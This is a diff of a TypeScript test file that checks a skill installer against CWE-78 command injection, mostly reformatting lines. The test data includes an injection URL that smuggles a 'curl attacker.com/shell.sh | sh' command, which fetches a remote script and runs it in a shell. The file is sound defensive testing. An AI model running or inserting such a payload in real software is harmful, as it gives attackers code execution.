@@ -47,15 +47,13 @@ describe("CWE-78: command injection via skillUrl", () => {
 		const { installSkill } = await import("../skill/install")
 
 		// Malicious URL containing shell injection payload
-		const maliciousUrl =
-			"http://evil.com/x; curl attacker.com/shell.sh | sh"
+		const maliciousUrl = "http://evil.com/x; curl attacker.com/shell.sh | sh"
 
 		await installSkill(maliciousUrl)
 
 		// After fix: execFileSync should be called instead of execSync
 		// The URL must be passed as a single array element, not interpolated into a string
-		const execFileSync =
-			childProcess.execFileSync as ReturnType<typeof vi.fn>
+		const execFileSync = childProcess.execFileSync as ReturnType<typeof vi.fn>
 		const execSync = childProcess.execSync as ReturnType<typeof vi.fn>
 
 		// execSync with a string command must NOT be called
@@ -68,9 +66,7 @@ describe("CWE-78: command injection via skillUrl", () => {
 		expect(args).toContain(maliciousUrl)
 		// The malicious URL must be a single, intact argument — not split by the shell
 		expect(
-			args.every(
-				(a: string) => !a.includes(";") || a === maliciousUrl,
-			),
+			args.every((a: string) => !a.includes(";") || a === maliciousUrl),
 		).toBe(true)
 	})
 
@@ -82,8 +78,7 @@ describe("CWE-78: command injection via skillUrl", () => {
 
 		await installSkill("test-ns/test-skill", maliciousAgent)
 
-		const execFileSync =
-			childProcess.execFileSync as ReturnType<typeof vi.fn>
+		const execFileSync = childProcess.execFileSync as ReturnType<typeof vi.fn>
 		expect(execFileSync).toHaveBeenCalledTimes(1)
 		const [, args] = execFileSync.mock.calls[0]
 		// The agent string must be passed as a single array element
@@ -96,8 +91,7 @@ describe("CWE-78: command injection via skillUrl", () => {
 
 		await installSkill("http://smithery.ai/skills/test/example")
 
-		const execFileSync =
-			childProcess.execFileSync as ReturnType<typeof vi.fn>
+		const execFileSync = childProcess.execFileSync as ReturnType<typeof vi.fn>
 		expect(execFileSync).toHaveBeenCalledTimes(1)
 		const [cmd, args] = execFileSync.mock.calls[0]
 		expect(cmd).toBe("npx")
@@ -119,8 +113,7 @@ describe("CWE-78: command injection via skillUrl", () => {
 			copy: true,
 		})
 
-		const execFileSync =
-			childProcess.execFileSync as ReturnType<typeof vi.fn>
+		const execFileSync = childProcess.execFileSync as ReturnType<typeof vi.fn>
 		expect(execFileSync).toHaveBeenCalledTimes(1)
 		const [cmd, args] = execFileSync.mock.calls[0]
 		expect(cmd).toBe("npx")
